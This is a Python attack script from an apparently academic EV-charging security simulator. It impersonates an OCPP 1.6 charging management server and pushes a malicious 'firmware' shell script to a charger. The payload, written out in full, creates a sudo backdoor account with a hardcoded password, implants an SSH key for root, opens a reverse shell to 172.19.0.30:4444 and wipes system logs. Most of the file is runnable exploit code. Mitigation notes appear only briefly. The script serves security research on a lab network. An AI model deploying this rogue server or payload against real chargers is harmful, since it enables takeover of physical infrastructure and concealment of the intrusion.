"""
===========================================================================
EVSecSim PoC — Attack #5: Malicious Firmware Update / Code Injection
===========================================================================

Based on: INL/CON-23-72329 PoC #3 — malicious firmware update with code
injection, demonstrated on a 350 kW DCFC EVSE at Idaho National Laboratory.

WHAT THIS ATTACK DOES
---------------------
OCPP 1.6 UpdateFirmware carries a plain HTTP/FTP URL and a scheduled
retrieval date. There is no firmware signature, no certificate, and no
integrity hash. The EVSE trusts the URL unconditionally.

This script acts as a rogue CSMS. It simultaneously runs:
  (a) A WebSocket server on port 9000 — impersonates a legitimate CSMS
  (b) An HTTP server on port 8080 — serves the malicious firmware payload

Attack phases:

  Phase 1 — Normal operation (0–10 s)
    The EVSE connects, boots, and sends MeterValues normally.
    It has no way to distinguish this rogue CSMS from the real one.
    OCPP 1.6 has no CSMS identity verification (no mutual TLS, no token).

  Phase 2 — Firmware push (t = 10 s)
    Sends UpdateFirmware to the EVSE with location pointing at the
    attacker-controlled HTTP server. The push_delay is configurable.

  Phase 3 — Payload execution (EVSE-side)
    The EVSE downloads the firmware, sends FirmwareStatusNotification
    progress messages (Downloading → Downloaded → Installing → Installed),
    and executes the payload. No verification step occurs at any point.

MALICIOUS PAYLOAD (served at http://<attacker>:8080/firmware.sh)
-----------------------------------------------------------------
  #!/bin/sh
  useradd -m -s /bin/bash backdoor
  echo 'backdoor:EV$ecr3t!' | chpasswd
  usermod -aG sudo backdoor
  echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys
  nohup bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1 &
-----------------------------------------------------------------

ROOT CAUSE
----------
OCPP 1.6 UpdateFirmware (section 5.19) has no:
  - Firmware hash / digest
  - Digital signature
  - Certificate binding to a known vendor
The EVSE downloads and executes whatever the CSMS URL points to.

THREAT MODEL
------------
  Attacker position : insider / compromised CSMS — operator-net
  Docker network    : operator-net (172.19.0.0/24)
  Attacker IP       : 172.19.0.30

MITIGATION
----------
  OCPP 2.0.1 — SignedUpdateFirmware with X.509 certificate chain
  Vendor firmware signing (code-signing certificate + hash check)
  EVSE refuses unsigned firmware
  Mutual TLS on CSMS WebSocket (EVSE verifies CSMS certificate)

HOW TO RUN (local — two terminals)
-----------------------------------
  Terminal 1 (this attack):
    python attacks/attack_firmware.py

  Terminal 2 (EVSE connects to rogue CSMS, not the real one):
    python core/evse_client4_fixed.py --url ws://127.0.0.1:9000

HOW TO RUN (Docker)
-------------------
  docker compose --profile firmware up --build

WIRESHARK
---------
  Filter : websocket && ip.dst == 172.19.0.30
  Look for: UpdateFirmware frame with attacker-controlled location URL
  Then    : FirmwareStatusNotification frames showing install progression

===========================================================================
"""

import asyncio
import argparse
import os
import signal
import threading
from datetime import datetime, timezone, timedelta
from http.server import BaseHTTPRequestHandler, HTTPServer

import websockets
from ocpp.routing import on
from ocpp.v16 import ChargePoint as cp, call, call_result
from ocpp.v16.enums import FirmwareStatus, RegistrationStatus

# ============================================================
# Colour helpers
# ============================================================
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def ts():
    return datetime.now().strftime("%H:%M:%S")

_attack_complete = asyncio.Event()

# ============================================================
# Malicious firmware payload (shell script)
# ============================================================
MALICIOUS_FIRMWARE = b"""\
#!/bin/sh
# ===================================================================
# PoC #3 Malicious Firmware Payload - EVSecSim / INL demonstration
# This is the payload the EVSE downloads and executes as root.
# In a real attack this would compromise the physical charger.
# ===================================================================

# 1. Create hidden backdoor admin account
useradd -m -s /bin/bash backdoor
echo 'backdoor:EV$ecr3t!' | chpasswd
usermod -aG sudo backdoor

# 2. Implant SSH public key for passwordless root access
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAA...TRUNCATED... attacker@evil.c2' \
    >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 3. Persistent reverse shell to attacker C2 (172.19.0.30 = this machine)
nohup bash -i >& /dev/tcp/172.19.0.30/4444 0>&1 &

# 4. Suppress local syslog to hide traces
systemctl stop rsyslog 2>/dev/null || true
journalctl --vacuum-time=1s 2>/dev/null || true

echo "[PAYLOAD] Backdoor installed. Reverse shell active on 172.19.0.30:4444"
id backdoor
"""

FIRMWARE_PATH = "/firmware.sh"


# ============================================================
# HTTP server — serves the malicious firmware file
# ============================================================
class PayloadHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        print(f"[{ts()}] {CYAN}[HTTP-PAYLOAD]{RESET} {fmt % args}")

    def do_GET(self):
        if self.path == FIRMWARE_PATH:
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition",
                             'attachment; filename="firmware.sh"')
            self.send_header("Content-Length", str(len(MALICIOUS_FIRMWARE)))
            self.end_headers()
            self.wfile.write(MALICIOUS_FIRMWARE)
            print(f"[{ts()}] {RED}{BOLD}[HTTP-PAYLOAD] "
                  f"Malicious firmware delivered to {self.client_address[0]}{RESET}")
        else:
            self.send_response(404)
            self.end_headers()


def start_http_server(host: str, port: int):
    srv = HTTPServer((host, port), PayloadHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"[{ts()}] {CYAN}[HTTP-PAYLOAD]{RESET} "
          f"Serving malicious firmware at http://{host}:{port}{FIRMWARE_PATH}")
    return srv


# ============================================================
# Rogue CSMS — impersonates a legitimate CSMS
# ============================================================
class RogueCsms(cp):
    """
    Accepts EVSE connections and behaves like a legitimate CSMS just long
    enough for the EVSE to trust it, then pushes an UpdateFirmware command
    pointing to the attacker-controlled HTTP server.
    """

    def __init__(self, *args, firmware_url: str, push_delay: int = 10, **kwargs):
        super().__init__(*args, **kwargs)
        self._firmware_url = firmware_url
        self._push_delay   = push_delay

    # ----------------------------------------------------------
    # OCPP message handlers (mimic a legitimate CSMS)
    # ----------------------------------------------------------
    @on('BootNotification')
    async def on_boot(self, charge_point_vendor, charge_point_model, **kwargs):
        print(f"[{ts()}] {GREEN}[ROGUE-CSMS]{RESET} BootNotification from {self.id} "
              f"({charge_point_vendor} / {charge_point_model})")
        print(f"[{ts()}] {GREEN}[ROGUE-CSMS]{RESET} "
              f"Accepted — EVSE cannot distinguish this from the real CSMS")
        asyncio.create_task(self._schedule_firmware_push())
        return call_result.BootNotification(
            current_time=datetime.now(timezone.utc).isoformat(),
            interval=10,
            status=RegistrationStatus.accepted,
        )

    @on('Heartbeat')
    async def on_heartbeat(self):
        return call_result.Heartbeat(
            current_time=datetime.now(timezone.utc).isoformat()
        )

    @on('MeterValues')
    async def on_meter_values(self, connector_id, meter_value, **kwargs):
        try:
            power = meter_value[0]["sampled_value"][0]["value"]
        except Exception:
            power = "N/A"
        print(f"[{ts()}] [ROGUE-CSMS] MeterValues from {self.id}: {power} kW")
        return call_result.MeterValues()

    @on('FirmwareStatusNotification')
    async def on_firmware_status(self, status, **kwargs):
        colour = {
            FirmwareStatus.downloading       : CYAN,
            FirmwareStatus.downloaded        : CYAN,
            FirmwareStatus.installing        : YELLOW,
            FirmwareStatus.installed         : RED,
            FirmwareStatus.installation_failed: RED,
            FirmwareStatus.download_failed   : RED,
        }.get(status, RESET)

        print()
        print(f"[{ts()}] {colour}{BOLD}[ROGUE-CSMS] "
              f"FirmwareStatusNotification: {status}{RESET}")

        if status == FirmwareStatus.downloaded:
            print(f"[{ts()}] {RED}[ROGUE-CSMS] "
                  f"EVSE downloaded payload — zero integrity checks performed{RESET}")

        if status == FirmwareStatus.installing:
            print(f"[{ts()}] {RED}[ROGUE-CSMS] "
                  f"EVSE is executing payload — backdoor being installed{RESET}")

        if status == FirmwareStatus.installed:
            print()
            print(f"[{ts()}] {RED}{BOLD}{'!'*60}{RESET}")
            print(f"[{ts()}] {RED}{BOLD}  PAYLOAD INSTALLED — EVSE FULLY COMPROMISED{RESET}")
            print(f"[{ts()}] {RED}{BOLD}  Backdoor user 'backdoor' created (sudo){RESET}")
            print(f"[{ts()}] {RED}{BOLD}  SSH key implanted in /root/.ssh/authorized_keys{RESET}")
            print(f"[{ts()}] {RED}{BOLD}  Reverse shell: 172.19.0.30:4444{RESET}")
            print(f"[{ts()}] {RED}{BOLD}{'!'*60}{RESET}")
            print()
            self._print_summary()
            asyncio.get_event_loop().call_later(2, _attack_complete.set)

        return call_result.FirmwareStatusNotification()

    @on('StopTransaction')
    async def on_stop_transaction(self, transaction_id, meter_stop,
                                  timestamp, **kwargs):
        return call_result.StopTransaction()

    # ----------------------------------------------------------
    # Firmware push (triggered after push_delay seconds)
    # ----------------------------------------------------------
    async def _schedule_firmware_push(self):
        print(f"[{ts()}] [ROGUE-CSMS] "
              f"Waiting {self._push_delay}s before pushing malicious firmware ...")
        await asyncio.sleep(self._push_delay)

        retrieve_date = (
            datetime.now(timezone.utc) + timedelta(seconds=1)
        ).isoformat()

        print()
        print(f"[{ts()}] {RED}{BOLD}[ROGUE-CSMS] === PHASE 2 — FIRMWARE PUSH ==={RESET}")
        print(f"[{ts()}] {RED}[ROGUE-CSMS] Sending UpdateFirmware to EVSE{RESET}")
        print(f"[{ts()}] {RED}[ROGUE-CSMS]   location     : {self._firmware_url}{RESET}")
        print(f"[{ts()}] {RED}[ROGUE-CSMS]   retrieve_date: {retrieve_date}{RESET}")
        print(f"[{ts()}] {YELLOW}[ROGUE-CSMS] OCPP 1.6 carries no firmware signature{RESET}")
        print()

        try:
            await self.call(call.UpdateFirmware(
                location=self._firmware_url,
                retrieve_date=retrieve_date,
            ))
        except Exception as exc:
            print(f"[{ts()}] [ROGUE-CSMS] UpdateFirmware failed: {exc}")

    def _print_summary(self):
        print(f"{BOLD}{'='*60}{RESET}")
        print(f"{BOLD}  Attack #5 complete — thesis evidence checklist{RESET}")
        print(f"{'='*60}")
        print(f"  {YELLOW}[Root cause]{RESET}  OCPP 1.6 UpdateFirmware has no signature field")
        print(f"  {YELLOW}[Root cause]{RESET}  EVSE has no way to verify CSMS identity (no mutual TLS)")
        print(f"  {RED}[Impact]{RESET}      Attacker achieves RCE on every charger EVSE")
        print(f"  {RED}[Impact]{RESET}      Physical infrastructure: charger can be disabled,")
        print(f"                  load manipulated, or used as pivot into operator-net")
        print()
        print(f"  Wireshark filter : websocket && ip.dst == 172.19.0.30")
        print(f"  Look for         : UpdateFirmware frame with attacker URL")
        print(f"  Then             : FirmwareStatusNotification sequence")
        print()
        print(f"  Mitigation:")
        print(f"    OCPP 2.0.1 SignedUpdateFirmware — X.509 signature on firmware")
        print(f"    Mutual TLS — EVSE verifies CSMS certificate before connecting")
        print(f"    EVSE firmware validation (hash + cert check) before install")
        print(f"{'='*60}")


# ============================================================
# WebSocket server handler
# ============================================================
async def ws_handler(websocket, firmware_url: str, push_delay: int):
    cp_id = "unknown"
    try:
        cp_id = await websocket.recv()
        print(f"[{ts()}] [ROGUE-CSMS] EVSE connected: {cp_id}")
        rogue = RogueCsms(cp_id, websocket,
                          firmware_url=firmware_url,
                          push_delay=push_delay)
        await rogue.start()
    except websockets.exceptions.ConnectionClosedOK:
        print(f"[{ts()}] [ROGUE-CSMS] {cp_id} disconnected cleanly.")
    except websockets.exceptions.ConnectionClosedError as exc:
        print(f"[{ts()}] [ROGUE-CSMS] {cp_id} disconnected with error: {exc}")


# ============================================================
# Main
# ============================================================
async def main():
    parser = argparse.ArgumentParser(
        description="Attack #5 — Malicious Firmware Update (OCPP 1.6 PoC #3)"
    )
    parser.add_argument("--csms-port",     type=int,
                        default=int(os.environ.get("CSMS_PORT", 9000)),
                        help="Port for the rogue CSMS WebSocket server")
    parser.add_argument("--payload-port",  type=int,
                        default=int(os.environ.get("PAYLOAD_PORT", 8080)),
                        help="Port for the HTTP payload server")
    parser.add_argument("--payload-bind",  default="0.0.0.0",
                        help="Bind address for the HTTP payload server")
    parser.add_argument("--firmware-host",
                        default=os.environ.get("FIRMWARE_HOST", "127.0.0.1"),
                        help="Hostname/IP the EVSE uses to reach the payload server")
    parser.add_argument("--push-delay",    type=int, default=10,
                        help="Seconds after EVSE boot before pushing UpdateFirmware")
    args = parser.parse_args()

    firmware_url = (
        f"http://{args.firmware_host}:{args.payload_port}{FIRMWARE_PATH}"
    )

    print()
    print(f"{RED}{BOLD}{'='*62}{RESET}")
    print(f"{RED}{BOLD}  EVSecSim Attack #5 — Malicious Firmware Update{RESET}")
    print(f"{RED}{BOLD}  INL/CON-23-72329 PoC #3{RESET}")
    print(f"{RED}{BOLD}{'='*62}{RESET}")
    print(f"  Threat model  : insider / compromised CSMS (operator-net)")
    print(f"  Rogue CSMS    : ws://0.0.0.0:{args.csms_port}")
    print(f"  Payload URL   : {firmware_url}")
    print(f"  Push delay    : {args.push_delay}s after EVSE boot")
    print(f"{RED}{BOLD}{'='*62}{RESET}")
    print()

    start_http_server(args.payload_bind, args.payload_port)

    import logging
    logging.getLogger("websockets.server").setLevel(logging.CRITICAL)

    server = await websockets.serve(
        lambda ws: ws_handler(ws, firmware_url, args.push_delay),
        "0.0.0.0",
        args.csms_port,
    )
    print(f"[{ts()}] [ROGUE-CSMS] Listening on ws://0.0.0.0:{args.csms_port}")
    print(f"[{ts()}] [ROGUE-CSMS] Waiting for EVSE to connect ...")
    print()

    loop = asyncio.get_running_loop()
    stop = loop.create_future()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, stop.set_result, None)
        except NotImplementedError:
            pass  # Windows

    # Exit when the attack completes or on SIGINT/SIGTERM
    attack_task = asyncio.create_task(_attack_complete.wait())
    done, pending = await asyncio.wait(
        [stop, attack_task],
        return_when=asyncio.FIRST_COMPLETED,
    )
    for t in pending:
        t.cancel()
    server.close()
    await server.wait_closed()


if __name__ == "__main__":
    asyncio.run(main())
